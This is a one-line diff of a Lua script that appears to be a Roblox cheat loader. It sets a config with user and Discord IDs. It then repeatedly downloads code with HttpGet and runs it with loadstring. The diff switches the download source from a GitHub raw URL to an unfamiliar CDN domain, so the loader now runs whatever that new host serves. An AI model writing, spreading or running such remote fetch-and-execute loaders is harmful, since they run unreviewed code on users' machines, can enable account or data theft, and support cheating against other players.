@@ -1,1 +1,1 @@
-_G.Config={UserID="5887ba0e-c847-48e8-8998-d955a6b7c083",discord_id="1378019320126509147",Note="Pc"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/sab"))()end)if s then break end wait(5)end
+_G.Config={UserID="5887ba0e-c847-48e8-8998-d955a6b7c083",discord_id="1378019320126509147",Note="Pc"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/sab"))()end)if s then break end wait(5)end
